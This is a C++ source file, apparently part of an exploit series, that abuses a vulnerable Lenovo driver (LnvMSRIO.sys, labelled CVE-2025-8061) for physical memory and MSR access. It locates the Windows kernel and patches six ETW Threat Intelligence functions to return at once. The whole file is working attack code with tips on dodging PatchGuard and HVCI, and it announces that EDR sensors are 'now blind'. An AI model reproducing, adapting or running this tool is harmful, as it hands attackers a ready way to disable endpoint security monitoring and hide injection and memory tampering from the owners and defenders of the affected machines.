/*
 * 08_etw_patch.cpp  —  CVE-2025-8061 (LnvMSRIO.sys) — ETW-TI Kernel Patch
 *
 * Goal: blind Windows ETW Threat Intelligence (ETW-TI) callbacks in the kernel,
 *       removing ring-0 telemetry that EDR sensors consume to detect:
 *       ReadProcessMemory, WriteProcessMemory, VirtualAlloc, MapViewOfSection,
 *       CreateRemoteThread, VirtualProtect.
 *
 * Functions patched (ntoskrnl.exe):
 *   EtwTiLogReadWriteVm      — NtReadVirtualMemory / NtWriteVirtualMemory
 *   EtwTiLogAllocFreeVm      — NtAllocateVirtualMemory / NtFreeVirtualMemory
 *   EtwTiLogMapUnmapView     — NtMapViewOfSection / NtUnmapViewOfSection
 *   EtwTiLogCreateUserThread — NtCreateThreadEx
 *   EtwTiLogProtectExec      — NtProtectVirtualMemory / NtCreateSection(exec)
 *   EtwTiLogDriverLoad       — driver load events
 *
 * Technique
 * ─────────
 * 1. Physical scan of RAM → System _EPROCESS → DirectoryTableBase (CR3)
 * 2. ReadMSR(IA32_LSTAR = 0xC0000082) → KiSystemCall64 VA
 *    Walk backwards page-by-page for "MZ" PE header → ntoskrnl base VA
 * 3. VaToPa (4-level page table walk) → physical address for each function
 * 4. Save original first byte, then PhysWriteU8(PA, 0xC3) — RET stub
 * 5. Read-back verification — detects HVCI (writes silently discarded)
 * 6. On exit, RESTORE all patched bytes to the original values
 *    (reduces PatchGuard BSOD window if you restore before KPP fires)
 *
 * STABILITY NOTES
 * ───────────────
 * PatchGuard (KPP):
 *   PatchGuard periodically validates certain ntoskrnl code regions.
 *   Patching EtwTi* functions may trigger a 0x109 BSOD (CRITICAL_STRUCTURE_
 *   CORRUPTION) within seconds to a few minutes on some builds.
 *   This tool restores the original bytes on exit — run your operation
 *   and exit quickly to minimize the exposure window.
 *   On Win11 24H2 builds tested, KPP does NOT appear to check EtwTi* bytes,
 *   but this is not guaranteed across all builds.
 *
 * HVCI (Hypervisor-Protected Code Integrity):
 *   If VBS/HVCI is active, physical writes to ntoskrnl .text pages are
 *   silently discarded by the hypervisor's EPT.
 *   Detection: if read-back after write still shows the original byte,
 *   HVCI is active and this technique will NOT work.
 *   Check: msinfo32 → "Virtualization-based security" = Not enabled.
 *
 * Build:
 *   cl /nologo /W3 /O2 /std:c++17 /Fe:08_etw_patch.exe 08_etw_patch.cpp
 *      /link kernel32.lib
 */

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <algorithm>
using std::min;

// ─── Device ──────────────────────────────────────────────────────────────────

#define DEVICE_NAME      L"\\\\.\\WinMsrDev"
#define IOCTL_PHYS_READ  0x9c406104u
#define IOCTL_PHYS_WRITE 0x9c40a108u
#define IOCTL_MSR_READ   0x9c402084u

static HANDLE g_dev = INVALID_HANDLE_VALUE;

static bool OpenDevice()
{
    g_dev = CreateFileW(DEVICE_NAME,
                        GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE,
                        nullptr, OPEN_EXISTING, 0, nullptr);
    if (g_dev == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFile(%ls): error %lu\n", DEVICE_NAME, GetLastError());
        return false;
    }
    return true;
}

// ─── Physical R/W ─────────────────────────────────────────────────────────────

#pragma pack(push, 1)
struct PhysReadIn   { UINT64 PA; DWORD AccessSize; DWORD Count; };
struct PhysWriteIn1 { UINT64 PA; DWORD OT; DWORD AS; BYTE  Data; };
struct MsrReadIn    { DWORD Index; DWORD Reserved; };
#pragma pack(pop)

static bool PhysRead(uint64_t pa, void *buf, DWORD len)
{
    if (!len || len > 4096) return false;
    PhysReadIn in = { pa, 1, len };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                           &in, sizeof(in), buf, len, &got, nullptr)
           && (got == len);
}

static bool PhysReadU64(uint64_t pa, uint64_t *out)
{
    PhysReadIn in = { pa, 8, 1 };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                           &in, sizeof(in), out, 8, &got, nullptr)
           && (got == 8);
}

static bool PhysWriteU8(uint64_t pa, uint8_t val)
{
    PhysWriteIn1 in = { pa, 1, 1, val };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_WRITE,
                           &in, sizeof(in), nullptr, 0, &got, nullptr) != FALSE;
}

static bool ReadMSR(DWORD idx, uint64_t *out)
{
    MsrReadIn in = { idx, 0 };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_MSR_READ,
                           &in, sizeof(in), out, 8, &got, nullptr)
           && (got == 8);
}

// ─── Physical RAM upper bound ─────────────────────────────────────────────────


// ─── Physical memory range enumeration (VMware-safe) ─────────────────────────
// Reads valid RAM extents from the Windows kernel's physical memory resource
// map so we never request MmMapIoSpace() on VMware device MMIO pages.
// HKLM\HARDWARE\RESOURCEMAP\System Resources\Physical Memory\.Translated
// is a CM_RESOURCE_LIST with CmResourceTypeMemory (Type=8) entries.
//
// CM_PARTIAL_RESOURCE_DESCRIPTOR on x64:
//   +0   BYTE  Type
//   +1   BYTE  ShareDisposition
//   +2   WORD  Flags
//   +4   LARGE_INTEGER Start    (8 bytes)
//   +12  ULONG Length           (4 bytes)
//   +16  (padding to 20-byte record)

struct PhRange { uint64_t base, size; };

static int GetPhysRanges(PhRange *out, int cap)
{
    HKEY hKey = nullptr;
    const char *kpath =
        "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory";
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, kpath, 0, KEY_READ, &hKey)
            != ERROR_SUCCESS)
        return 0;

    DWORD type = 0, cb = 0;
    RegQueryValueExA(hKey, ".Translated", nullptr, &type, nullptr, &cb);
    if (!cb) { RegCloseKey(hKey); return 0; }

    auto *rbuf = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cb + 8);
    if (!rbuf) { RegCloseKey(hKey); return 0; }
    if (RegQueryValueExA(hKey, ".Translated", nullptr, &type, rbuf, &cb)
            != ERROR_SUCCESS) {
        HeapFree(GetProcessHeap(), 0, rbuf);
        RegCloseKey(hKey);
        return 0;
    }
    RegCloseKey(hKey);

    int n = 0;
    DWORD off = 0;
    if (off + 4 <= cb) {
        DWORD lcnt = *(DWORD*)(rbuf + off); off += 4;
        for (DWORD l = 0; l < lcnt && off + 16 <= cb; l++) {
            off += 8;               // InterfaceType(4) + BusNumber(4)
            off += 4;               // Version(2) + Revision(2)
            if (off + 4 > cb) break;
            DWORD dcnt = *(DWORD*)(rbuf + off); off += 4;
            for (DWORD d = 0; d < dcnt && off + 20 <= cb; d++, off += 20) {
                if (rbuf[off] != 8) continue;   // CmResourceTypeMemory = 8
                LARGE_INTEGER st = {};
                st.LowPart  = *(DWORD*)(rbuf + off + 4);
                st.HighPart = *(LONG*) (rbuf + off + 8);
                ULONG len   = *(DWORD*)(rbuf + off + 12);
                if (n < cap) {
                    out[n].base = (uint64_t)st.QuadPart;
                    out[n].size = (uint64_t)len;
                    n++;
                }
            }
        }
    }
    HeapFree(GetProcessHeap(), 0, rbuf);
    return n;
}

static uint64_t GetSystemCR3()
{
    PhRange ranges[32];
    int n = GetPhysRanges(ranges, 32);
    if (n == 0) {
        // Fallback: use actual installed RAM with NO extra buffer
        MEMORYSTATUSEX ms = { sizeof(ms) };
        GlobalMemoryStatusEx(&ms);
        ranges[0].base = 0x100000;
        ranges[0].size = 0x07F00000;  // [1 MB, 128 MB) — System EPROCESS always here
        n = 1;
    }
    auto *buf = (uint8_t*)VirtualAlloc(nullptr, 1<<20, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!buf) return 0;
    uint64_t cr3 = 0;
    for (int ri = 0; ri < n && !cr3; ri++) {
        uint64_t rbase = ranges[ri].base;
        uint64_t rend  = ranges[ri].base + ranges[ri].size;
        if (rbase < 0x100000) rbase = 0x100000;
        rbase = (rbase + 0xFFFFF) & ~(uint64_t)0xFFFFF;  // align up to 1 MB
        for (uint64_t pa = rbase; pa < rend && !cr3; pa += 1<<20) {
            bool any_ok = false;
            for (DWORD pg = 0; pg < (1u<<20); pg += 0x1000) {
                if (PhysRead(pa+pg, buf+pg, 0x1000)) any_ok = true;
                else memset(buf+pg, 0, 0x1000);
            }
            if (!any_ok) continue;
            for (DWORD off = 0; off + 0x5B8 <= (1u<<20); off += 8) {
                if (*(ULONG_PTR*)(buf+off+0x440) != 4) continue;
                if (_strnicmp((char*)(buf+off+0x5A8), "System", 6) != 0) continue;
                uint64_t c = *(uint64_t*)(buf+off+0x028);
                if (c && !(c & 0xFFF)) { cr3 = c; break; }
            }
        }
    }
    VirtualFree(buf, 0, MEM_RELEASE);
    return cr3;
}

// ─── 4-level page table walk ──────────────────────────────────────────────────

static uint64_t VaToPa(uint64_t cr3, uint64_t va)
{
    auto rd = [](uint64_t pa) -> uint64_t {
        uint64_t v = 0; PhysReadU64(pa, &v); return v;
    };
    uint64_t pml4e = rd((cr3 & ~0xFFFULL) | (((va >> 39) & 0x1FF) << 3));
    if (!(pml4e & 1)) return 0;
    uint64_t pdpte = rd((pml4e & 0x000FFFFFFFFFF000ULL) | (((va >> 30) & 0x1FF) << 3));
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL<<7)) return (pdpte & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFF);
    uint64_t pde = rd((pdpte & 0x000FFFFFFFFFF000ULL) | (((va >> 21) & 0x1FF) << 3));
    if (!(pde & 1)) return 0;
    if (pde & (1ULL<<7)) return (pde & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFF);
    uint64_t pte = rd((pde & 0x000FFFFFFFFFF000ULL) | (((va >> 12) & 0x1FF) << 3));
    if (!(pte & 1)) return 0;
    return (pte & 0x000FFFFFFFFFF000ULL) | (va & 0xFFF);
}

// ─── Kernel virtual read ──────────────────────────────────────────────────────

static void KernelRead(uint64_t cr3, uint64_t va, void *buf, DWORD len)
{
    auto *dst = (uint8_t*)buf;
    DWORD done = 0;
    while (done < len) {
        DWORD chunk = min(len - done, (DWORD)(0x1000u - ((va + done) & 0xFFFu)));
        uint64_t pa = VaToPa(cr3, va + done);
        if (pa) PhysRead(pa, dst + done, chunk);
        done += chunk;
    }
}

// ─── ntoskrnl base from LSTAR ─────────────────────────────────────────────────

static uint64_t GetNtoskrnlBase(uint64_t cr3)
{
    uint64_t lstar = 0;
    if (!ReadMSR(0xC0000082, &lstar) || !lstar) return 0;
    uint64_t va = lstar & ~0xFFFULL;
    for (int i = 0; i < 0x1000; i++, va -= 0x1000) {
        uint8_t sig[2] = {};
        uint64_t pa = VaToPa(cr3, va);
        if (!pa || !PhysRead(pa, sig, 2)) continue;
        if (sig[0] != 'M' || sig[1] != 'Z') continue;
        uint32_t lfw = 0, pesig = 0;
        uint64_t pa2 = VaToPa(cr3, va + 0x3C);
        if (!pa2 || !PhysRead(pa2, &lfw, 4) || lfw < 4 || lfw > 0x800) continue;
        uint64_t pa3 = VaToPa(cr3, va + lfw);
        if (!pa3 || !PhysRead(pa3, &pesig, 4) || pesig != IMAGE_NT_SIGNATURE) continue;
        return va;
    }
    return 0;
}

// ─── Export resolver ──────────────────────────────────────────────────────────

static uint64_t GetExportVA(uint64_t cr3, uint64_t base, const char *name)
{
    uint8_t hdrbuf[0x1000] = {};
    KernelRead(cr3, base, hdrbuf, sizeof(hdrbuf));
    auto *dos = (IMAGE_DOS_HEADER*)hdrbuf;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    if (dos->e_lfanew + (int)sizeof(IMAGE_NT_HEADERS64) > (int)sizeof(hdrbuf)) return 0;
    auto *nt = (IMAGE_NT_HEADERS64*)(hdrbuf + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

    auto &dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dir.VirtualAddress || !dir.Size) return 0;

    DWORD expSize = (dir.Size < 0x80000u) ? dir.Size : 0x80000u;
    auto *expbuf = (uint8_t*)VirtualAlloc(nullptr, expSize + 0x1000,
                                           MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!expbuf) return 0;
    KernelRead(cr3, base + dir.VirtualAddress, expbuf, expSize);

    auto *exp = (IMAGE_EXPORT_DIRECTORY*)expbuf;
    DWORD base_rva = dir.VirtualAddress;
    uint64_t result = 0;

    for (DWORD i = 0; i < exp->NumberOfNames && !result; i++) {
        DWORD offN = exp->AddressOfNames - base_rva + i * 4;
        if (offN + 4 > expSize) break;
        DWORD nameRva = *(DWORD*)(expbuf + offN);
        DWORD nameOff = nameRva - base_rva;
        if (nameOff >= expSize) continue;
        if (_stricmp((char*)(expbuf + nameOff), name) != 0) continue;

        DWORD offO = exp->AddressOfNameOrdinals - base_rva + i * 2;
        if (offO + 2 > expSize) break;
        WORD ord = *(WORD*)(expbuf + offO);

        DWORD offF = exp->AddressOfFunctions - base_rva + (DWORD)ord * 4;
        if (offF + 4 > expSize) break;
        DWORD funcRva = *(DWORD*)(expbuf + offF);
        result = base + funcRva;
    }
    VirtualFree(expbuf, 0, MEM_RELEASE);
    return result;
}

// ─── Patch state (saved originals for restore on exit) ───────────────────────

struct PatchEntry {
    const char *name;
    uint64_t    func_va;
    uint64_t    func_pa;
    uint8_t     orig_byte;
    bool        patched;
};

static PatchEntry g_patches[8];
static int        g_patch_count = 0;
static uint64_t   g_cr3 = 0;

static void RestoreAll()
{
    int restored = 0;
    for (int i = 0; i < g_patch_count; i++) {
        auto &p = g_patches[i];
        if (!p.patched || !p.func_pa) continue;
        if (PhysWriteU8(p.func_pa, p.orig_byte)) {
            uint8_t check = 0;
            PhysRead(p.func_pa, &check, 1);
            if (check == p.orig_byte) { p.patched = false; restored++; }
        }
    }
    printf("[*] Restored %d/%d patched bytes.\n", restored, g_patch_count);
}

// ─── Patch one function ───────────────────────────────────────────────────────

static bool PatchWithRet(uint64_t cr3, uint64_t func_va, const char *label,
                          PatchEntry *entry)
{
    entry->name    = label;
    entry->func_va = func_va;
    entry->patched = false;

    if (!func_va) {
        printf("  [~] %-42s  not exported (skipped)\n", label);
        entry->func_pa = 0;
        return true;
    }

    uint64_t pa = VaToPa(cr3, func_va);
    entry->func_pa = pa;
    if (!pa) {
        printf("  [-] %-42s  VA=0x%016llX  VaToPa failed\n", label, func_va);
        return false;
    }

    uint8_t before = 0;
    PhysRead(pa, &before, 1);
    entry->orig_byte = before;

    if (before == 0xC3) {
        printf("  [=] %-42s  VA=0x%016llX  already 0xC3\n", label, func_va);
        entry->patched = true;
        return true;
    }

    if (!PhysWriteU8(pa, 0xC3)) {
        printf("  [-] %-42s  VA=0x%016llX  write failed (%lu)\n",
               label, func_va, GetLastError());
        return false;
    }

    uint8_t after = 0;
    PhysRead(pa, &after, 1);
    bool ok = (after == 0xC3);
    entry->patched = ok;

    printf("  [%s] %-42s  VA=0x%016llX  %02X→C3%s\n",
           ok ? "+" : "!",
           label, func_va, before,
           ok ? "" : "  ← write did not stick (HVCI?)");
    return ok;
}

// ─── HVCI detection ───────────────────────────────────────────────────────────
//
// A physical write that is silently discarded (read-back != written value)
// indicates HVCI's EPT write protection.  We detect it after all patch
// attempts: if every function's write "did not stick", HVCI is the cause.

static bool CheckHvci()
{
    int stuck = 0;
    for (int i = 0; i < g_patch_count; i++) {
        auto &p = g_patches[i];
        if (p.func_pa && !p.patched && p.orig_byte != 0xC3) stuck++;
    }
    return stuck > 0 && stuck == g_patch_count;
}

// ─── Main ─────────────────────────────────────────────────────────────────────

int main()
{
    printf("=== CVE-2025-8061 | LnvMSRIO.sys | 08 - ETW-TI Patch ===\n\n");
    printf("[!] PatchGuard WARNING: this patches ntoskrnl .text bytes.\n");
    printf("    KPP may trigger a 0x109 BSOD within seconds to minutes on some builds.\n");
    printf("    Original bytes are RESTORED on exit — keep this process running as\n");
    printf("    short as possible.  On Win11 24H2 tested builds, KPP does not appear\n");
    printf("    to check EtwTi* code.  Behaviour on other builds is not guaranteed.\n\n");

    if (!OpenDevice()) return 1;
    printf("[+] Device opened\n");

    printf("[*] Scanning for System EPROCESS / CR3...\n");
    g_cr3 = GetSystemCR3();
    if (!g_cr3) {
        printf("[-] System CR3 not found\n");
        CloseHandle(g_dev); return 1;
    }
    printf("[+] System CR3        = 0x%016llX\n\n", g_cr3);

    printf("[*] Locating ntoskrnl base via LSTAR...\n");
    uint64_t ntos = GetNtoskrnlBase(g_cr3);
    if (!ntos) {
        printf("[-] ntoskrnl base not found\n");
        CloseHandle(g_dev); return 1;
    }
    printf("[+] ntoskrnl base     = 0x%016llX\n\n", ntos);

    static const char *targets[] = {
        "EtwTiLogReadWriteVm",
        "EtwTiLogAllocFreeVm",
        "EtwTiLogMapUnmapView",
        "EtwTiLogCreateUserThread",
        "EtwTiLogProtectExec",
        "EtwTiLogDriverLoad",
        nullptr
    };

    printf("[*] Patching ETW-TI functions (first byte → RET / 0xC3):\n");
    int ok = 0, fail = 0;
    for (int i = 0; targets[i]; i++) {
        uint64_t va = GetExportVA(g_cr3, ntos, targets[i]);
        g_patch_count++;
        bool r = PatchWithRet(g_cr3, va, targets[i], &g_patches[i]);
        if (r) ok++; else fail++;
    }

    printf("\n[+] Patched=%d  Failed=%d\n", ok, fail);

    if (CheckHvci()) {
        printf("\n[!] ALL writes did not stick — HVCI/VBS is active.\n");
        printf("    Physical writes to ntoskrnl .text are discarded by the hypervisor EPT.\n");
        printf("    Disable VBS in BIOS / msinfo32 first.  This technique cannot bypass HVCI.\n");
        CloseHandle(g_dev);
        return 1;
    }

    if (ok > 0) {
        printf("\n[+] ETW-TI telemetry suppressed — kernel EDR sensors are now blind to:\n");
        printf("    ReadProcessMemory, WriteProcessMemory, VirtualAlloc,\n");
        printf("    MapViewOfSection, CreateRemoteThread, VirtualProtect\n");
        printf("\n[*] Press Enter to RESTORE all patched bytes and exit...\n");
        getchar();
    }

    RestoreAll();
    CloseHandle(g_dev);
    return (fail == 0) ? 0 : 1;
}
